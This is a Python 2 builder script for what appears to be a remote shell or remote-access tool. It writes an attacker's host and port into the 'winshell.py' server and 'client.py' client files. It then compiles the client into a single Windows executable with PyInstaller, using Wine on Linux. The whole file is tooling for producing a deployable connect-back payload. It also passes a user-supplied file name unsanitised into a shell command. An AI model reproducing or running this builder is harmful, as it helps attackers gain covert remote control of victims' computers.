#coding:utf-8
import optparse, os, socket, sys, platform, subprocess
from colorama import init, Fore, Style

class Generate:
	def __init__(self):
		init()
		self.red = Fore.RED + Style.BRIGHT
		self.green = Fore.GREEN + Style.BRIGHT
		self.default = Style.RESET_ALL + Style.BRIGHT
		self.blue = Fore.BLUE + Style.BRIGHT

	def check_arg(self, host, port):
		print "{}[*]{} Checking the argument...                        ".format(self.blue, self.default),
		try:
			socket.gethostbyname(host)
		except:
			print "[{}ERR{}]".format(self.red, self.default)
			print "{}[-]{} Cannot resolve '{}', Unknow host".format(self.red, self.default, host)
			exit(0)
		if not port.isdigit() or not 0 <= int(port) <= 65535:
			print "[{}ERR{}]".format(self.red, self.default)
			print "{}[-]{} You must enter a valid port".format(self.red, self.default)
			exit(0)
		print "[{}OK{}]".format(self.green, self.default)

	def add_argument_to_the_server(self, port):
		print "{}[*]{} Setting the port in the server...               ".format(self.blue, self.default),
		if not os.path.isfile("winshell.py"):
			print "[{}ERR{}]".format(self.red, self.default)
			print "{}[-]{} Can't find the server file (winshell.py)".format(self.red, self.default)
			exit(0)

		f = open("winshell.py", "r")
		lf_content = f.readlines()
		f.close()
		for i in range(0, len(lf_content)):
			if lf_content[i][0:9] == "		port = ":
				lf_content[i] = "		port = {}\r\n".format(port)
				break

		f = open("winshell.py", "w")
		f.writelines(lf_content)
		f.close()
		print "[{}OK{}]".format(self.green, self.default)

	def add_argument_to_the_client(self, host, port):
		print "{}[*]{} Setting the host and the port in the client...  ".format(self.blue, self.default),
		if not os.path.isfile("client.py"):
			print "[{}ERR{}]".format(self.red, self.default)
			print "{}[-]{} Can't find the server file (winshell.py)".format(self.red, self.default)
			exit(0)

		f = open("client.py", "r")
		lf_content = f.readlines()
		f.close()
		for i in range(0, len(lf_content)):
			if lf_content[i][0:8] == "	host = ":
				lf_content[i] = "	host = '{}'\n".format(host)
			if lf_content[i][0:8] == "	port = ":
				lf_content[i] = "	port = {}\n".format(port)
				break

		f = open("client.py", "w")
		f.writelines(lf_content)
		f.close()
		print "[{}OK{}]".format(self.green, self.default)

	def py_to_exe(self, name):
		print "{}[*]{} Creating the executable...                      ".format(self.blue, self.default),
		if platform.system() == "Windows":
			pyinstaller_path = os.path.dirname(sys.executable) + "\\Scripts\\pyinstaller.exe"
			try:
				p = subprocess.Popen("{} -F -n {} client.py".format(pyinstaller_path, name), stdout=subprocess.PIPE, stderr=subprocess.PIPE)
				stdout, stderr = p.communicate()
				print "[{}OK{}]\n".format(self.green, self.default)
				print "{}[+]{} Success to generate the {} !".format(self.green, self.default, name)
			except:
				print "[{}ERR{}]".format(self.red, self.default)
				print "{}[-]{} Failed to execute the pyinstaller command".format(self.red, self.default)
				exit(0)

		elif platform.system() == "Linux":
			pyinstaller_path = "wine ~/.wine/drive_c/Python27/Scripts/pyinstaller.exe"
			try:
				mcmd = pyinstaller_path + " -F -n " + name + " client.py"
				p = subprocess.Popen(mcmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
				stdout, stderr = p.communicate()
				print "[{}OK{}]\n".format(self.green, self.default)
				print "{}[+]{} Success to generate the {} !".format(self.green, self.default, name)
			except:
                                print "[{}ERR{}]".format(self.red, self.default)
                                print "{}[-]{} Failed to execute the pyinstaller command".format(self.red, self.default)
                                exit(0)



def main():
	parser = optparse.OptionParser("usage : --host <host> --port <port>")
	parser.add_option("--host", dest="host", type="string", help="specify the server host")
	parser.add_option("--port", dest="port", type="string", help="specify the port to use")
	parser.add_option("--out", dest="name", type="string", help="specify the name of the output file", default="out")
	options, args = parser.parse_args()
	if options.host == None or options.port == None:
	    print parser.usage
	    exit(0)
	name = options.name
	if ".exe" in name:
	    name = name.split(".")[0]

	host = options.host
	port = str(options.port)

	MGenerate = Generate()
	MGenerate.check_arg(host, port)
	MGenerate.add_argument_to_the_server(port)
	MGenerate.add_argument_to_the_client(host, port)
	MGenerate.py_to_exe(name)

if "__main__" == __name__:
	main()
